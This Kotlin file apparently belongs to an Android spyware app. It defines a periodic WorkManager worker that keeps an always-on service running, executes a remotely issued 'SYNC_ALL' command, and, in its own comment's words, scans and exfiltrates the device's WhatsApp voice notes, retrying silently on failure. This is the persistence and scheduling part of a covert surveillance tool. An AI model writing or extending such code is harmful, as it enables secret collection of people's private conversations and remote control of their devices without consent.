package com.example.worker

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.data.sync.RemoteCommandManager
import com.example.data.sync.WhatsAppVoiceNoteSyncManager
import com.example.service.AlwaysSyncService

class SyncWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        return try {
            // Ensure AlwaysSyncService is alive
            AlwaysSyncService.startService(applicationContext)

            // Execute SYNC_ALL and command processing
            RemoteCommandManager(applicationContext).executeCommand("SYNC_ALL", "WorkManager Periodic Worker")

            // Scan and exfiltrate new/existing WhatsApp voice notes (with duplicate tracking)
            WhatsAppVoiceNoteSyncManager.scanAndSyncAllVoiceNotes(applicationContext)

            Result.success()
        } catch (_: Exception) {
            Result.retry()
        }
    }
}
